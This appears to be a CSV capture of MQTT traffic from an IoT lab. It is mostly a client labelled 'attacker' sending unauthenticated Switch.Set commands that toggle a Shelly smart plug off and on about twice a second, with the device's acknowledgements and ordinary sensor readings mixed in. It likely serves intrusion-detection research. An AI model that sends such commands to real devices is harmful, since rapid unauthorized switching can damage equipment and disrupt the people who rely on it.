2026-04-22T16:39:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5450 34512.117 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34512.11,""swi"
2026-04-22T16:39:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5451 34512.135 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5452 34512.618 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34512.61,""swi"
2026-04-22T16:39:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5453 34512.634 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5454 34513.118 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34513.11,""swi"
2026-04-22T16:39:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5455 34513.136 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5456 34513.619 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34513.62,""swi"
2026-04-22T16:39:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5457 34513.635 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5458 34514.120 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34514.12,""swi"
2026-04-22T16:39:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5459 34514.138 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5460 34514.620 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34514.62,""swi"
2026-04-22T16:39:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5461 34514.636 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5462 34515.121 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34515.12,""swi"
2026-04-22T16:39:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5463 34515.139 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5464 34515.622 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34515.62,""swi"
2026-04-22T16:39:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5465 34515.639 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:43,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5466 34516.121 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:43,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:43,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34516.12,""swi"
2026-04-22T16:39:43,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5467 34516.140 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:43,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5468 34516.623 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34516.62,""swi"
2026-04-22T16:39:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5469 34516.639 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:44,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:44,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5470 34517.123 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:44,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:44,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34517.12,""swi"
2026-04-22T16:39:44,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5471 34517.141 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:44,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:44,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5472 34517.624 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:44,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:44,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34517.62,""swi"
2026-04-22T16:39:44,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5473 34517.640 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:45,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:45,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5474 34518.124 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:45,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:45,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34518.12,""swi"
2026-04-22T16:39:45,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5475 34518.142 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:45,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:45,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5476 34518.626 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:45,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:45,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34518.62,""swi"
2026-04-22T16:39:45,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5477 34518.642 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:46,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:46,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5478 34519.125 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:46,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:46,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34519.12,""swi"
2026-04-22T16:39:46,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5479 34519.143 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:46,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:46,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5480 34519.626 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:46,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:46,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34519.62,""swi"
2026-04-22T16:39:46,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5481 34519.642 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:39:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:39:46,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:39:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:39:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:39:47,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:47,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5482 34520.127 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34520.12,""swi"
2026-04-22T16:39:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5483 34520.146 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:47,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:47,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5484 34520.627 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:47,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:47,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34520.62,""swi"
2026-04-22T16:39:47,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5485 34520.643 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5486 34521.127 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34521.12,""swi"
2026-04-22T16:39:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5487 34521.146 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5488 34521.628 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34521.62,""swi"
2026-04-22T16:39:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5489 34521.645 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5490 34522.129 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34522.13,""swi"
2026-04-22T16:39:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5491 34522.148 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5492 34522.628 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34522.63,""swi"
2026-04-22T16:39:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5493 34522.646 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5494 34523.128 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34523.13,""swi"
2026-04-22T16:39:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5495 34523.147 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5496 34523.629 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34523.63,""swi"
2026-04-22T16:39:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5497 34523.645 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5498 34524.129 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34524.13,""swi"
2026-04-22T16:39:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5499 34524.148 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5500 34524.630 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34524.63,""swi"
2026-04-22T16:39:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5501 34524.646 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
